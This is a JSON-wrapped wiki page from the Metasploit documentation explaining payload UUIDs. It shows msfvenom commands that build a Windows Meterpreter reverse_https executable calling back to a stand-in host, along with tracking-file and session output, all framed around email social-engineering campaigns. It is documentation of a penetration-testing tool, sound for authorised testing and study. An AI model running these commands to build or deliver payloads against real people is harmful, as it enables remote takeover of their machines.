{"componentChunkName":"component---src-templates-wiki-template-tsx","path":"/wiki/Misc/Payload-UUID","result":{"data":{"markdownRemark":{"id":"0bd9bde4-1431-5100-8e8c-5d715f3f9f19","frontmatter":{"title":"Payload UUID","root":null},"html":"<p>In mid-2015, a new feature was added to many HTTP and TCP Metasploit payloads: Payload UUIDs. A Payload UUID is a 16-byte value that encodes an 8-byte identifier, a 1-byte architecture ID, a 1-byte platform ID, a 4-byte timestamp, and two additional bytes for obfuscation. The <a href=\"https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/uuid.rb\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">source code comments</a> go into more detail.</p>\n<p>In the case of HTTP payloads, the 16-byte UUID value is encoded in <a href=\"https://tools.ietf.org/html/rfc4648#section-5\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">base64url</a> format resulting in a 22-byte string. This value is always placed in the beginning of the URL used by the payload. TCP payloads send the 16-byte raw value over the socket once a connection is established.</p>\n<p>The goal of Payload UUIDs is three-fold:</p>\n<ul>\n<li>Uniquely identify a generated payload. This is important when running social engineering campaigns to identify what specific payload a target executed. If an email campaign resulted in one user forwarding a payload to another user before it was executed, this can be determined by reviewing the UUID in the session listing.</li>\n<li>Drop connections that do not match known UUIDs. This allows a listener to be setup that only allows known sessions to connect, which is important when running internet-facing payload handlers.</li>\n<li>Enable universal handlers. The embedded platform and architecture identifiers allow the listener to determine what type of stage to send back to a stager. This will eventually allow for a single listener to be used with multiple exploits, even those that target different platforms and architectures.</li>\n</ul>\n<h3 id=\"specifying-the-uuid\" style=\"position:relative;\"><a href=\"#specifying-the-uuid\" aria-label=\"specifying the uuid permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Specifying the UUID</h3>\n<p>Although Payload UUIDs are normally random, it is possible to specify a static UUID value using the <code class=\"language-text\">PayloadUUIDRaw</code> option. This option takes a 8-byte hex string, such as \"0011223344556677\". For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDRaw=4444444444444444 -f exe -o payload.exe</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Instead of specifying a static UUID as the raw 8-byte value, it is also possible to derive a static UUID using an arbitrary-length string using the PayloadUUIDSeed option:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDSeed=ShellsAreDelicious -f exe -o payload.exe</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h3 id=\"tracking-the-uuid\" style=\"position:relative;\"><a href=\"#tracking-the-uuid\" aria-label=\"tracking the uuid permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tracking the UUID</h3>\n<p>Payload UUIDs are enabled by default, but are not tracked unless the <code class=\"language-text\">PayloadUUIDTracking</code> option is set to <code class=\"language-text\">true</code>. Setting this option causes a new entry to be created in <code class=\"language-text\">~/.msf4/payloads.json</code> when any UUID-enabled payload is generated. It is also possible to create a local-only name for a given UUID using the <code class=\"language-text\">PayloadUUIDName</code>. The example below will create a new registered payload with a custom name:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDTracking=true PayloadUUIDName=EmailCampaign20150101 -f exe -o payload.exe\n\n$ cat ~/.msf4/payloads.json\n{\n  &quot;68017d72958c40f6&quot;: {\n    &quot;arch&quot;: &quot;x86&quot;,\n    &quot;platform&quot;: &quot;windows&quot;,\n    &quot;timestamp&quot;: 1435277049,\n    &quot;payload&quot;: &quot;payload/windows/meterpreter/reverse_https&quot;,\n    &quot;datastore&quot;: {&quot;AutoLoadStdapi&quot;:true,&quot;AutoRunScript&quot;:&quot;&quot;,&quot;AutoSystemInfo&quot;:true,&quot;AutoVerifySession&quot;:true,&quot;AutoVerifySessionTimeout&quot;:30,&quot;EXITFUNC&quot;:&quot;process&quot;,&quot;EnableStageEncoding&quot;:false,&quot;EnableUnicodeEncoding&quot;:false,&quot;HttpUnknownRequestResponse&quot;:&quot;\\u003Chtml\\u003E\\u003Cbody\\u003E\\u003Ch1\\u003EIt works!\\u003C/h1\\u003E\\u003C/body\\u003E\\u003C/html\\u003E&quot;,&quot;IgnoreUnknownPayloads&quot;:false,&quot;InitialAutoRunScript&quot;:&quot;&quot;,&quot;LHOST&quot;:&quot;127.1.1.1&quot;,&quot;LPORT&quot;:4444,&quot;MeterpreterServerName&quot;:&quot;Apache&quot;,&quot;MeterpreterUserAgent&quot;:&quot;Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)&quot;,&quot;OverrideRequestHost&quot;:false,&quot;PAYLOADUUIDNAME&quot;:&quot;EmailCampaign20150101&quot;,&quot;PayloadProxyPort&quot;:0,&quot;PayloadProxyType&quot;:&quot;HTTP&quot;,&quot;PayloadUUIDTracking&quot;:true,&quot;PrependMigrate&quot;:false,&quot;ReverseListenerBindPort&quot;:0,&quot;SessionCommunicationTimeout&quot;:300,&quot;SessionExpirationTimeout&quot;:604800,&quot;SessionRetryTotal&quot;:3600,&quot;SessionRetryWait&quot;:10,&quot;StageEncoderSaveRegisters&quot;:&quot;&quot;,&quot;StageEncodingFallback&quot;:true,&quot;StagerRetryCount&quot;:10,&quot;StagerURILength&quot;:0,&quot;StagerVerifySSLCert&quot;:false,&quot;VERBOSE&quot;:false},\n    &quot;name&quot;: &quot;EmailCampaign20150101&quot;,\n    &quot;urls&quot;: [\n  &quot;/aAF9cpWMQPb-3f_cq1FoJA040uMw26kAnvroJdztpVzDrNpqbpT7t3DyYy0cR2TyQE87XxHgIOKiYwP2FJNlNjrBXWQNiGWtzUK1ueJ0DyFjCXmULVo_gGrvi&quot;\n]\n}\n}</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Once this payload is launched, the output of the <code class=\"language-text\">sessions -l -v</code> command will show the UUID, whether or not the UUID is registered, and any locally-assigned name of the UUID:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(handler) &gt; run -j\n[*] 127.0.0.1:36235 (UUID: 68017d72958c40f6/x86=1/windows=1/2015-06-26T00:04:09Z) Staging Native payload ...\n[*] Meterpreter session 1 opened (127.1.1.1:4444 -&gt; 127.0.0.1:36235) at 2015-06-25 17:12:40 -0700\n\nmsf exploit(handler) &gt; sessions  -l -v\n\nActive sessions\n===============\n\n  Session ID: 1\n        Type: meterpreter x86/win32\n        Info: fang\\hdm @ fang\n      Tunnel: 127.1.1.1:4444 -&gt; 127.0.0.1:36235 (127.0.0.1)\n         Via: exploit/multi/handler\n        UUID: 68017d72958c40f6/x86=1/windows=1/2015-06-26T00:04:09Z\n   MachineID: 1fd541d2c4278e2d0c1b02f17f142f2b\n     CheckIn: 1s ago @ 2015-06-25 17:12:47 -0700\n  Registered: Yes - Name=&quot;EmailCampaign20150101&quot;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"whitelisting-uuids\" style=\"position:relative;\"><a href=\"#whitelisting-uuids\" aria-label=\"whitelisting uuids permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Whitelisting UUIDs</h3>\n<p>The <code class=\"language-text\">~/.msf4/payloads.json</code> file can also be used as a whitelist. This makes it possible to run a listener on a common port on a public IP address without the Metasploit Framework instance being flooded with bogus sessions. To enable whitelisting, set the <code class=\"language-text\">IgnoreUnknownPayloads</code> option to <code class=\"language-text\">true</code> in the handler instance. Any incoming request that does match both a registered Payload UUID and one of the pre-generated URLs will be ignored. The <code class=\"language-text\">payloads.json</code> file can be copied between Metasploit Framework instances and even hand-edited while the framework is running.</p>"}},"pageContext":{"id":"0bd9bde4-1431-5100-8e8c-5d715f3f9f19"}}}